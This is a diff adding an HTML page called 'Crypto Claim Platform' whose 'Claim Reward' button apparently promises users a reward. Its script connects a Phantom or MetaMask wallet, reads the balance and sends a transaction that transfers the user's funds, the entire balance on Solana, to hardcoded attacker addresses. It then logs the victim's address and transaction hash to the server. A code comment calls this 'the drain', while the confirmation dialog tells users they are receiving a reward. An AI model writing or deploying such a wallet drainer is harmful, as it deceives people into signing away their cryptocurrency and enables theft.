@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Claimer</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: #111;
+      color: #eee;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #1c1c1c;
+      padding: 40px;
+      border-radius: 15px;
+      width: 100%;
+      max-width: 450px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    h1 {
+      margin-bottom: 30px;
+      font-size: 1.8rem;
+    }
+    button {
+      width: 100%;
+      padding: 12px 0;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
+      background: #333;
+      color: #fff;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    button:hover:not(:disabled) {
+      background: #555;
+    }
+    button:disabled {
+      background: #222;
+      cursor: not-allowed;
+    }
+    .status, .wallet-info {
+      margin-top: 15px;
+      font-size: 0.9rem;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Crypto Claim Platform</h1>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="claimBtn" disabled>Claim Reward</button>
+  <div class="wallet-info" id="walletInfo"></div>
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+const NETWORKS = {
+  solana: {
+    recipient: "Fi8NSiU9gq1PoAcdKvtjcXSBAKpdeoAQqDdxvVutv9xJ",
+    rpc: "https://api.mainnet-beta.solana.com"
+  },
+  ethereum: {
+    recipient: "0x0A2575eD232725751b2d31Df200741c020d13c90"
+  }
+};
+
+let selectedNetwork = 'solana';
+let userAddress = null;
+
+const connectBtn = document.getElementById('connectBtn');
+const claimBtn = document.getElementById('claimBtn');
+const walletInfo = document.getElementById('walletInfo');
+const status = document.getElementById('status');
+
+// Connect wallet
+connectBtn.addEventListener('click', async () => {
+  status.textContent = 'Connecting wallet...';
+  try {
+    if (selectedNetwork === 'solana') {
+      const provider = window.solana;
+      if (!provider || !provider.isPhantom) throw new Error("Install Phantom wallet");
+      const resp = await provider.connect();
+      userAddress = resp.publicKey.toString();
+      walletInfo.textContent = `Wallet: ${userAddress}`;
+    } else {
+      if (!window.ethereum) throw new Error("Install MetaMask");
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      userAddress = accounts[0];
+      walletInfo.textContent = `Wallet: ${userAddress}`;
+    }
+    status.textContent = 'Wallet connected';
+    claimBtn.disabled = false;
+  } catch (e) {
+    console.error(e);
+    status.textContent = 'Failed to connect wallet';
+  }
+});
+
+// Claim crypto (user signs transaction)
+claimBtn.addEventListener('click', async () => {
+  if (!userAddress) {
+    status.textContent = 'Connect wallet first';
+    return;
+  }
+
+  // Confirm the drain
+  const confirmed = confirm(`You are about to receive a reward of ${selectedNetwork.toUpperCase()} to the recipient address. Do you consent?`);
+  if (!confirmed) return;
+
+  status.textContent = 'Claiming reward...';
+
+  try {
+    if (selectedNetwork === 'solana') {
+      const provider = window.solana;
+      const connection = new solanaWeb3.Connection(NETWORKS.solana.rpc, 'confirmed');
+      const balance = await connection.getBalance(new solanaWeb3.PublicKey(userAddress));
+      const lamports = balance;
+      const tx = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: provider.publicKey,
+          toPubkey: new solanaWeb3.PublicKey(NETWORKS.solana.recipient),
+          lamports
+        })
+      );
+      const signed = await provider.signAndSendTransaction(tx);
+      await connection.confirmTransaction(signed.signature, 'confirmed');
+      status.textContent = `Reward claimed! Signature: ${signed.signature}`;
+
+      // Log transaction
+      fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ network: 'solana', userAddress, txHash: signed.signature }) });
+
+    } else {
+      const provider = window.ethereum;
+      const balance = await provider.request({ method: 'eth_getBalance', params: [userAddress, 'latest'] });
+      const value = BigInt(balance) / BigInt(1e18);
+      const txHash = await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{ from: userAddress, to: NETWORKS.ethereum.recipient, value: value.toString() }]
+      });
+      status.textContent = `Reward claimed! Hash: ${txHash}`;
+
+      // Log transaction
+      fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ network: 'ethereum', userAddress, txHash }) });
+    }
+  } catch (e) {
+    console.error(e);
+    status.textContent = 'Claim failed or rejected';
+  }
+});
+</script>
+
+</body>
+</html>
